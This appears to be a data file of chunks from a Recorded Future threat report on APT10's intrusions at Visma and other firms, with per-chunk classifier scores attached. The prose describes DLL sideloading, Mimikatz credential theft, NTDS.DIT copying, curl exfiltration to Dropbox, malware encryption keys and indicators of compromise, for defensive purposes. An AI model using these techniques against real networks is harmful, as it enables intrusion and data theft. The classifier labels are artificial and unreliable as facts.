        "text": "| CTA-2019-0206 | 9 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 10CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nSubnet Registration AS\n104.237.86.0/24 Los Angeles Cloud, HostAware AS32181 \u2014 GigeNET\n45.56.155.0/24 VPN Consumer Network AS32181 \u2014 GigeNET\n45.62.52.0/24 Los Angeles Cloud, HostAware AS32181 \u2014 GigeNET\n173.239.198.0/24 VPN Consumer Network AS36351 \u2014 SoftLayer Technologies Inc.\nVPN Consumer Network is an ambiguous Panama-registered entity.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.20918221771717072
        },
        "prediction": {}
    },
    {
        "text": "Based on information in WHOIS registration records, the website for\nthe company is vpnconsumer.com, which is a nondescript landing\npage only containing the abuse contact details and a physical address\nin Panama. BGP routing information shows that the organization\nmanages 44/24 subnets hosted around the world, many of which\nresolve to low-cost VPN services, such as ExpressVPN.\n Insikt Group analysis of network metadata to and from the VPN\nendpoint IPs revealed consistent connectivity to Citrix-hosted\ninfrastructure from all eight VPN endpoint IPs starting on August\n17, 2018 \u2014 the same date the first authenticated login to Visma\u2019s\nnetwork was made using stolen credentials.\n After almost two weeks, on August 30, 2018, APT10 attackers\nused their access to the network to move laterally and made their\nfirst deployment of an RC4- and Salsa20-encrypted variant of the\nTrochilus malware using a previously associated DLL sideloading\ntechnique. Two separate infection chains leveraging this specific\nDLL sideloading technique were identified on the Visma network\nusing legitimate known good binaries that had DLL search-order\npath issues. This means that APT10 actors had two separate access\npoints into the Visma network.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.26833730936050415
        },
        "prediction": {}
    },
    {
        "text": "Once on the Visma network, APT10 attackers used the Microsoft\nBITSAdmin CLI tool to copy malicious tools from a suspected\nattacker-controlled C2 hosted on 173.254.236[.]158 to the \\\nProgramData\\temp\\ directory on the infected host.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.627722442150116
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 10CYBER THREAT ANALYSIS\nThe copied files included:\n\u2022 A legitimate binary for the uninstaller for PDF printing\napplication PDF-Xchange 2011 Lite DE, renamed from\nunins000.exe to CASTSP.exe (f6e0f076e27391a6e6eb23f23f77c\n2ff078488875113df388640aca8bf4dd64b)\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4299989342689514
        },
        "prediction": {}
    },
    {
        "text": "An accompanying malicious DLL, version.dll (10182f0e64b765\ndb989c158402c76eb1e0e862cab407f7c5cec133d8e5cb73e3)\n\u2022 A DES-encrypted shellcode configuration containing the\nTrochilus implant into the same folder (42b5eb1f77a25ad73\n202d3be14e1833ef0502b0b6ae7ab54f5d4b5c2283429c6)\n After the files were copied across the attacker-executed CASTSP.exe,\nthis file sideloaded and ran version.dll, which in turn decrypted and\ndecompressed the encrypted shellcode and injected the Trochilus\npayload into memory.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.48177456855773926
        },
        "prediction": {}
    },
    {
        "text": "Trochilus\nLegitimate binary for CASTSP.exe executed version.dll decrypts Trochilus variant deployed\nPDF-Xchange 2011 Lite DE which sideloads shellcode and injects in memory, with C2\nuninstaller, unins000.exe, version.dll Trochilus payload communications encrypted\nrenamed to CASTSP.exe into memory using XOR, RC4, and Salsa20\nby attackers\nInfection Chain 1.\n Infection Chain 2: September 4, 2018\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.40435361862182617
        },
        "prediction": {}
    },
    {
        "text": "A few days later, APT10 used an almost identical approach used\nduring Infection Chain 1 to deploy Trochilus onto another part\nof Visma\u2019s network. While the deployed DLL and the encrypted\nshellcode were named differently, the underlying method\nof malware installation was the same as Infection Chain 1.\n The files remotely copied into C:\\ProgramData\\temp\\ using\nBITSAdmin included:\n\u2022 Another dropper renamed to \u201cCASTSP.exe\u201d that this time\nwas a legitimately signed Microsoft Visual Studio binary\nTailoredDeploy.Host.exe (also known as TailoredDeploy.exe)\n(fc6a130504b54fa72cfc104c656fe2cd92d7998f42ca064e22\n167e1d402a1514)\nRecorded Future | www.recordedfuture.com",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4046548306941986
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 11 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 12CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\n\u2022 A malicious DLL, vcruntime140.dll (eed0c7f7d36e75382c83\ne945a8b00abf01d3762b973c952dec05ceccb34b487d)\n\u2022 A DES-encrypted Trochilus payload\n(e6280de09f9adf79212409529eb25c0c2ea73e33a50281e222\n28a3db3998eecb)\n The execution method was identical: CASTSP.exe sideloaded and\nran vcruntime140.dll, which decrypted and decompressed the\nencrypted shellcode configuration and injected the Trochilus\npayload into a system process in-memory on the host machine.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.33359184861183167
        },
        "prediction": {}
    },
    {
        "text": "Trochilus\nLegitimate binary for CASTSP.exe executed vcruntime140.dll Trochilus variant\nMicrosoft Visual Studio, which sideloads decrypts shellcode and deployed in memory, with\nTailoredDeploy.Host.exe, vcruntime140.dll injects Trochilus C2 communications\nrenamed to CASTSP.exe payload into memory encrypted using XOR,\nby attackers RC4, and Salsa20\nInfection Chain 2.\n Malware Analysis\nThe malware sets used for both infection chains are nearly identical\nboth in infection method and code structure. Because the malware\nfor both infection chains were so similar, it is only necessary to\ninclude the in-depth analysis for one chain here, so we focused on\nInfection Chain 1. It included the binaries below:\n\u2022 CASTSP.exe: A valid and signed application that utilizes DLL\nsideloading to execute the malicious DLL, \u201cversion.dll\u201d\n\u2022 Version.dll: Main functionality of \u201cVersion.dll\u201d is to decrypt and\nexecute the Trochilus payload\n\u2022 CZYSOYKPOIKKZGUFOIUI: DES-encrypted Trochilus payload\nTrochilus Implant\nThe Trochilus loader, version.dll, has four entry points, as\nshown below. The malicious entrypoint called by CASTSP.exe is\nDllEntryPoint.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.17701303958892822
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 12CYBER THREAT ANALYSIS\nAfter version.dll runs, it loads the file CZYSOYKPOIKKZGUFOIUI\ninto memory. The file \u201cCZYSOYKPOIKKZGUFOIUI\u201d is 387,094 bytes\nof binary code that is not human-readable.\n After the file is loaded, the next function, sub_6a351000, starts the\ndecryption routine for CZYSOYKPOIKKZGUFOIUI. The file is DES-\nencrypted and the key can be identified being loaded into memory\nat the start of the decryption routine.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.43697845935821533
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 13 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 14CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nOnce the payload is decrypted, version.dll creates a new process\nin a suspended state and writes the Trochilus payload into the\nsuspended process. Next, version.dll resumes the process,\nexecuting the Trochilus payload.\n Trochilus attribution.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.33026617765426636
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 14CYBER THREAT ANALYSIS\nThis variant of Trochilus is significantly different from some of the\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.615547239780426
        },
        "prediction": {}
    },
    {
        "text": "The C2 infrastructure, network communications,\nand encryption are different from prior versions, but the code\nsimilarities and the use of DLL sideloading demonstrate that this\nis just another variant of Trochilus. First, the libraries below are\nincluded in the Trochilus variant and are known to be a part of the\nsource code upon which Trochilus is based on.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5950233340263367
        },
        "prediction": {}
    },
    {
        "text": "\u2022 SelfDestruction.cpp\n\u2022 MySocket.cpp\n\u2022 CommManager.cpp\n\u2022 Common.cpp\n\u2022 Main.cpp\n\u2022 Manager.cpp\n\u2022 ServiceManager.cpp\n\u2022 TCPComm.cpp\n\u2022 UDPComm.cpp\nSecond, the unencrypted C2 beacon, _msgid.23.__serial.0.clientid.\n xxxxxxxxxxxxxxx, is a well-defined component of the Trochilus\nsource code.\n The capabilities of Trochilus are well documented in other research\nreports, but the C2 infrastructure for this variant uses a combination\nof XOR, RC4, and Salsa20, which is different from what has previously\nbeen reported for Trochilus.\nCommand and Control Infrastructure\nThe C2 domain www.miphomanager[.]com is hardcoded, and after\na successful DNS request for the IP address, the Trochilus implant\nwill use that IP address for communication.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3972395062446594
        },
        "prediction": {}
    },
    {
        "text": "1 https://www.us-cert.gov/ncas/alerts/TA17-117A, https://www.carbonblack.\ncom/2017/05/09/carbon-black-threat-research-dissects-red-leaves-malware-leverages-dll-\nside-loading/, https://blogs.jpcert.or.jp/en/2017/04/redleaves---malware-based-on-open-\nsource-rat.html\nRecorded Future | www.recordedfuture.com | CTA-2019-0206 | 15 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 16CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nThe encoding and encryption routines used in this variant are\ndifferent from other variants and use three stages of encryption.\n Other variants have typically used XOR encoding with RC4 encryption\nto obfuscate C2 communication.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.2272741049528122
        },
        "prediction": {}
    },
    {
        "text": "The rolling XOR key\nis computed by taking two initial values, Constant 1 and Constant\n2, and adding them together.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6069853901863098
        },
        "prediction": {}
    },
    {
        "text": "The result is then divided against the\ndivisor 0xff. The remainder of this result is used as the XOR key.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.713507354259491
        },
        "prediction": {}
    },
    {
        "text": "On\nthe second iteration, Constant 1 is now saved as Constant 2, and\nConstant 2 becomes the remainder from the previous operation.\n They are added together and again divided by the divisor 0xff to\nproduce the next XOR key.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6413138508796692
        },
        "prediction": {}
    },
    {
        "text": "This process repeats until the end of\nthe cleartext string. A Python script is provided below showing this\nencoding function.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.7323552966117859
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 16CYBER THREAT ANALYSIS\nOur analysis revealed that the \u201c__msgid.23.\u201d cleartext string below\nwas sent to the XOR function above.\n Stage 2: RC4 Encryption\nThe resulting data then goes to the second stage, which is RC4\nencryption using the hard-coded string NASDKJF7832Hnkjsadf87\n8UHds89iujkhNHKJDHJDH8UIYE98uihwjshewde8w. The main\nroutine shown below takes the key and then sends it to the function\nsub_B49252, which initializes the key-scheduling algorithm (KSA)\nand pseudo-random generation algorithm (PRGA), which are the\ntwo key components of RC4 encryption.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4243272840976715
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 17 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 18CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nStage 3: Salsa20 Encryption\nFor the final phase, the resulting data from the RC4 encryption is\nthen encrypted again, this time with Salsa20. Salsa20 is another\nstream cipher that encrypts data in 64-byte blocks. Salsa20 uses a\nsecret key and nonce to initialize the encryption.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3678595721721649
        },
        "prediction": {}
    },
    {
        "text": "These values are\nhard-coded and are:\n\u2022 Secret Key: 0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0xA,0xB,0xC,\n0xD,0xE,0xF,0x10\n\u2022 Nonce: 0x65,0x66,0x67,0x68,0x69,0x6A,0x6B,0x6C (\u201cefghijkl\u201d)\nRecorded Future | www.recordedfuture.com | CTA-2019-0206 | 18CYBER THREAT ANALYSIS\nAfter the message is encrypted, it is then sent via an HTTP POST to\nthe C2 host, which in this case is the domain www.miphomanager[.]\ncom. The HTTP headers are provided in the figure below.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.32054829597473145
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 19 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 20CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nInfrastructure\nDNS log data revealed that requests were made for the malicious\nTrochilus C2 domain, www.miphomanager[.]com, as early as August\n30, 2018 \u2014 only two weeks after Visma was initially compromised\non August 17, 2018.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.39783167839050293
        },
        "prediction": {}
    },
    {
        "text": "This slight delay may point to the handing over\nof active exploitation duties to other operator(s) in a multi-team\nAPT10 effort within the Ministry of State Security for the attack.\n ",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.681438684463501
        },
        "prediction": {}
    },
    {
        "text": "According to WHOIS information, the malicious \"miphomanager\"\ndomain was registered with a relatively small Bahamas-based\ndomain registrar, internet.bs. This registrar is widely noted to host\na disproportionate number of rogue or malicious websites, with the\nregistrar aggressively marketing itself as an \u201coffshore\u201d registrar.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5803297162055969
        },
        "prediction": {}
    },
    {
        "text": "Other\nexamples of malicious infrastructure registered with internet.bs\ninclude domains for APT28\u2019s VPNFilter malware campaign and the\nregistration of the cyber-berkut[.]org domain that was affiliated\nwith the pro-Russian and potentially Russian state-linked threat\nactor CyberBerkut.\n  The registrant organization name was privacy protected using Whois\nPrivacy Corp, and the registered name servers for the malicious C2\nwere listed as:\n\u2022 Ns-canada.topdns[.]com\n\u2022 Ns-uk.topdns[.]com\n\u2022 Ns-usa.topdns[.]com\nInternet.bs and the name servers listed above were noted in the\nregistration of a malicious C2 used in a KHRAT campaign targeting\nCambodia. KHRAT is a backdoor trojan purported to be used with\nthe China-linked cyberespionage group DragonOK.\n  All three name servers appear in Recorded Future with an unusual\nrisk rating as they appear in the \u201cBambenek Consulting C&C\nNameserver Blocklist\u201d threat list, because of their prevalence in\nbeing associated with a Zeus-based banking trojan, Sphinx.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.2741016745567322
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 20CYBER THREAT ANALYSIS\nCredential Harvesting and Exfiltration\nDuring our investigation, we also found evidence of a legitimate\ndecompression utility typically packaged with Java named\n\u201cunpack200.exe\u201d being executed on the Visma network. This utility\nsideloaded Mimikatz (pd.exe) and enabled credential theft from\nVisma users. Interestingly, the same combination of unpack200.\nexe to deploy Mimikatz was used by the same attackers in both the\napparel company and U.S.-based law firm breaches.\n Using the newly acquired credentials, the attacker accessed Visma\u2019s\nMicrosoft Active Directory domain controller, deployed Trochilus,\nand made a copy of the \u201cNTDS.DIT\u201d database file containing Active\nDirectory data for Visma\u2019s corporate network, including password\nhashes for all users in the domain.\n The NTDS.DIT file and accompanying stolen data was then packaged\nup using a renamed WinRAR executable (r.exe) that was transferred\nacross by the attacker who then used cURL for Windows (renamed\nto \u201cCU.exe\u201d) to upload the exfil to content.dropboxapi.com.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.25848737359046936
        },
        "prediction": {}
    },
    {
        "text": "The\nRAR files followed a naming convention of a short run of repeating\ncharacters (for example, kkk.rar, ss.rar, pp.rar, dds.rar, gggg.rar,\netc).\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5479111075401306
        },
        "prediction": {}
    },
    {
        "text": "Rapid7 research revealed the exfiltrated content from Visma was\nuploaded to a Dropbox account that contained files from another\nincident related to the compromise of an international apparel\ncompany that they were investigating.\n US-Based Law Firm Attack\nIn late 2017, Rapid7 responded to a breach at a U.S.-based law firm.\n The attacker first gained access to the victim environment through\nCitrix servers. Once inside the victim network, the attacker deployed\ntheir own customized malware and also used known good binaries\nthat have DLL search order hijacking issues in order to perform DLL\nsideloading to execute customized versions of Mimikatz in order\nto retrieve passwords.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.39366796612739563
        },
        "prediction": {}
    },
    {
        "text": "The filename for the custom malware was\n\u201cccSEUPDT.exe\u201d (MD5: d8e37f07fdc9827871f0f959519275e1), a\nlegitimate Symantec Security Submission Engine Update Module\nbinary. The custom malware also would have a DLL in the same staging\nRecorded Future | www.recordedfuture.com",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5505284070968628
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 21 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 22CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\ndirectory and a randomized 15-character uppercase and lowercase\nalpha character set filename without an extension that contained the\nshellcode.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.46338850259780884
        },
        "prediction": {}
    },
    {
        "text": "The attacker used unpack200.exe (MD5: 6807be8466955b\nafffa568b6da0e785c), a decompression program that\ncomes with Java 8 and their copy of Mimikatz was placed\ninto MSVCR100.DLL (MD5: c8ea12ee884f274ca35fa54a073\ndf130).\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.415259450674057
        },
        "prediction": {}
    },
    {
        "text": "These methods of initial ingress into the victim networks and the\nmethod of obtaining passwords remained consistent TTPs across\nall victims.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.698706328868866
        },
        "prediction": {}
    },
    {
        "text": "However, if deployed, systems\nthat perform process.start creation would log the command line\nbeing passed to the binary and could be reviewed, and then\nsignatures created that look for the common flags could be passed\nto Mimikatz. The attacker would also move laterally by mounting the\nremote drive on a system, copying \u201c1.bat\u201d to it, use task scheduler\nto execute, and then delete the batch script.\n In order to perform exfiltration of the stolen data, the attacker used\ncommon file compression utilities (rar.exe) to create archives of\nthe information they intended to exfiltrate, and then used common\ncommand line-based web clients (curl.exe) to transfer the stolen\ndata to a cloud-based storage provider (Dropbox). This TTP for data\nexfiltration remained consistent across all victims.\n To maintain access to the victim network from the external\npublic internet, the attacker deployed password-protected\nASP eval webshells (Filename \u201ciisstart.aspx,\u201d SHA256:\n243d47fc2a24b391e1153d5c7807c6e5de51aba65fc79465d7b3e\n5c64d5fac41) within the client environment in order to maintain\naccess.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3121497631072998
        },
        "prediction": {}
    },
    {
        "text": "This resembled the server-side ASPX payload of the China Chopper\nwebshell documented previously. Uploads to VirusTotal in late\nAugust 2018 resembling the same filename, iisstart.aspx, indicate\nthe deployed webshell was likely a version of the China Chopper\nwebshell known to have been used by several Chinese threat actors.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5851345062255859
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 22CYBER THREAT ANALYSIS\nThe attacker also used TeamViewer in order to maintain remote\naccess to compromised systems within the victim environment.\n International Apparel Company Attack\nIn early 2018, Rapid7 identified that the attackers compromised an\napparel company, based upon detections and intelligence gathered\nfrom the U.S.-based law firm breach. The attacker gained access to\nthe victim\u2019s internet-accessible Citrix systems and authenticated to\nthem from networks associated with low-cost VPN providers owned\nby VPN Consumer Network.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.33515819907188416
        },
        "prediction": {}
    },
    {
        "text": "The attackers used\nidentical TTPs for executing malware and Mimikatz as observed\nbefore, by using DLL sideloading with known good binaries that had\nDLL search order path issues. The attackers used the Notepad++\nupdater GUP.exe (MD5: f5322b2f18605674b9a0c1757de5fd94),\nthe Java archive decompression utility unpack200.exe\n(MD5: 6807be8466955bafffa568b6da0e785c), renamed\nfrom \u201ccoInst.exe,\u201d and Norton Identity Safe binary CASRTSP.\n exe (MD5: 1e3a57cff7cba8732364c26f4bbdcbe2). These\nbinaries were used to load malware from DLL files\nMSVCR100.DLL (MD5: 5739c1f17503e21e56667d53ea823401)\nand libcurl.dll (MD5: 8f07160febdb240909b27aa519b\nba575).",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.2428237795829773
        },
        "prediction": {}
    },
    {
        "text": "Rapid7 reviewed malware discovered in the victim\u2019s\nenvironment and found implants that used Dropbox as the C2.\n The attackers used the same method of lateral movement by\nmounting the remote drive on a system, copying 1.bat to it, using\ntask scheduler to execute the batch script, and finally, deleting the\nbatch script.\n For exfiltration of stolen data, the attacker used WinRAR and\nrenamed \u201crar.exe\u201d to \u201cr.exe\u201d to create archives, upload them with\n\u201ccurl.exe\u201d (renamed to \u201cc.exe\u201d), and again, use the cloud storage\nprovider Dropbox.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.46751901507377625
        },
        "prediction": {}
    },
    {
        "text": "Rapid7 discovered that additional data was\nplaced into the Dropbox accounts under control of the attacker\nduring the compromise and was able to attribute data that was\nplaced into it as being owned by Visma. Rapid7 then provided a\nbreach notification to Visma to alert them to this compromise in\nSeptember 2018.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.68002849817276
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 23 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 24CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nOutlook\nWe identified three victims of cyberespionage operations since\nlate 2017 across the managed IT service provider, retail, and legal\nsectors.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3872256278991699
        },
        "prediction": {}
    },
    {
        "text": "We assess with high confidence\nthat the attacks were conducted by Chinese MSS threat actor APT10,\nbased on the evidence outlined in this report, summarized below:\n1.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6192954182624817
        },
        "prediction": {}
    },
    {
        "text": "While the\nvariant has not been noted publicly previously, Trochilus\nis widely used by APT10.\n2.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6077951192855835
        },
        "prediction": {}
    },
    {
        "text": "The use of legitimate binaries to sideload malicious DLLs\nthat decrypt and decompress shellcode configuration files\ncontaining a Trochilus payload.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6308638453483582
        },
        "prediction": {}
    },
    {
        "text": "The use of Notepad++ updater (filename \u201cgup.exe\u201d) to load\nmalicious DLL (libcurl.dll) in the deployment of the APT10\nbackdoor, UPPERCUT.\n 4. Extensive use of command-line tools including, but not\nlimited to, Mimikatz, cURL for Windows, BITSAdmin, and\nWinRAR, to perform actions on-host.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4220506548881531
        },
        "prediction": {}
    },
    {
        "text": "The targeting of a Norwegian MSP, which enabled potential\naccess to an extensive customer base. We believe that the\nAPT10 targeting of Visma is an extension of their 2017 Cloud\nHopper operation (which victimized some of the world\u2019s\nlargest MSPs) and has continued into late 2018.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6381783485412598
        },
        "prediction": {}
    },
    {
        "text": "The unauthorized access to Citrix remote desktop clients at\nVisma using stolen credentials occured at times\ncorresponding to Tianjin working hours (GMT +8).\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6696671843528748
        },
        "prediction": {}
    },
    {
        "text": "We believe APT10 is the most significant known Chinese\nstate-sponsored cyber threat to global corporations.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6864742636680603
        },
        "prediction": {}
    },
    {
        "text": "Their\nunprecedented campaign against MSPs, alleged to have\nincluded some of the largest MSPs in the world, in order to\nconduct secondary attacks against their clients, grants the\nChinese state the ability to potentially access the networks of\nhundreds (if not thousands) of corporations around the world.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6255397200584412
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 24CYBER THREAT ANALYSIS\nThis campaign brings to light further evidence supporting\nthe assertions made by the Five Eyes nations, led by the U.S.\nDepartment of Justice indictment against APT10 actors outlining the\nunprecedented scale of economic cyberespionage being conducted\nby the Chinese Ministry of State Security. Crucially, the variety\nof businesses targeted prove that these campaigns are being\nconducted against corporations across the commercial spectrum,\naimed at undermining international norms in trade to erode the\ncompetitive advantage of companies that have invested heavily in\npatented technology.\n This report, alongside the plethora of other reporting on APT10\noperations, acutely highlights the vulnerability of organizational\nsupply chains. Often, third parties in the supply chain are less likely\nto adopt high-end, expensive security measures, and therefore offer\nan attacker a convenient access vector to target interconnected\norganizations.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.2799840569496155
        },
        "prediction": {}
    },
    {
        "text": "Also, the targeting of cloud providers exploits the\ntrust companies place in the security of the cloud services they use.\n Based on publicly available information, we assess that this intrusion\nwas conducted by the group that is known as APT10. However,\nduring the course of this investigation, we have had privileged\nconversations that lead us to believe that in the future, portions of\nwhat is now known as APT10 will be recategorized as a new group.\n There is insufficient data at this time to make that distinction.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.505427896976471
        },
        "prediction": {}
    },
    {
        "text": "Network Defense Recommendations\nRecorded Future recommends organizations conduct the following\nmeasures outlined in this section in conjunction with the advice\npublished by US-CERT2 and the U.K.\u2019s NCSC3 when defending against\nAPT10 attempts to gain network access.\n \u2022 Configure your intrusion detection systems (IDS), intrusion\nprevention systems (IPS), or any network defense mechanisms\nin place to alert on \u2014 and upon review, consider blocking\nillicit connection attempts from \u2014 the external IP addresses\nand domains listed in Appendix A.\n2 https://www.us-cert.gov/ncas/alerts/TA17-117A, https://www.us-cert.gov/APTs-Targeting-\nIT-Service-Provider-Customers, https://www.us-cert.gov/ncas/alerts/TA18-276B\n3 https://www.ncsc.gov.uk/content/files/protected_files/article_files/APT10%20alert%20\nv2_0.pdf\nRecorded Future | www.recordedfuture.com | CTA-2019-0206 | 25 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 26CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\n\u2022 Implement the provided SNORT rules in Appendix B into your\nIDS and IPS appliance and investigate any alerts generated for\nactivity resembling the TTPs outlined in this report on APT10.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.14799009263515472
        },
        "prediction": {}
    },
    {
        "text": "Conduct regular Yara scans across your enterprise for the new\nrules listed in Appendix C and those listed in the official U.S.\nand U.K. government advisories listed above.\n \u2022 Consider blocking any connection attempts emanating from\nIPs resolving to \u201cVPN Consumer Network\u201d (listed in Appendix\nB) and consider implementing a VPN whitelisting policy based\non approved vendors.\n \u2022 Detection of potential ASP eval webshells can be difficult, but\ncan be accomplished by deploying file integrity monitoring\nof the web root directories on all servers with a client\nenvironment.\n \u2022 Detection of exfiltration based on network flow data would be\ndifficult if the attacker chose to use the same cloud storage\nprovider that the victim has standardized upon. However, if\nSSL is proxied for monitoring, signatures can be created to\nidentify this activity by checking the user agent or method\nof client header construction against the Dropbox client\napplications themselves.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3175028860569
        },
        "prediction": {}
    },
    {
        "text": "If so, consider detecting, alerting, and blocking\nrequests for the nameservers below associated with the\ndisproportionately malicious domain registrar internet.bs:\n\u2022 ns-uk.topdns.com\n\u2022 ns-usa.topdns.com\n\u2022 ns-canada.topdns.com\nRecorded Future | www.recordedfuture.com | CTA-2019-0206 | 26CYBER THREAT ANALYSIS\nAppendix A \u2014 Indicators of Compromise\nIPv4\n173.254.236[.]158\n104.237.86[.]157\n104.237.86[.]183\n173.239.198[.]167\n45.56.155[.]117\n45.56.155[.]143\n45.56.155[.]147\n45.62.52[.]42\n 45.62.52[.]7\n45.76.30[.]127\nDomains\nwww.miphomanager[.]com\nwww.llpsearch[.]com\nHashes\nMD5: C8ea12ee884f274ca35fa54a073df130 - MSVCR100.dll\nMD5: 8f07160febdb240909b27aa519bba575 - libcurl.dll\nSHA256: 42b5eb1f77a25ad73202d3be14e1833ef0502b0b6ae7ab54f5d4b5c2283429c6 - CZYSOYKPOIKKZGUFOIUI (Infection\nChain 1)\nSHA256: F6e0f076e27391a6e6eb23f23f77c2ff078488875113df388640aca8bf4dd64b - CASTSP.exe (Infection Chain 1)\nSHA256: 10182f0e64b765db989c158402c76eb1e0e862cab407f7c5cec133d8e5cb73e3 - version.dll (Infection Chain 1)\nSHA256: Fc6a130504b54fa72cfc104c656fe2cd92d7998f42ca064e22167e1d402a1514 - CASTSP.exe (Infection Chain 2)\nSHA256: E6280de09f9adf79212409529eb25c0c2ea73e33a50281e22228a3db3998eecb - RUTLFJPBTJSFZZAOJTYP (Infection Chain\n2)\nSHA256: Eed0c7f7d36e75382c83e945a8b00abf01d3762b973c952dec05ceccb34b487d - 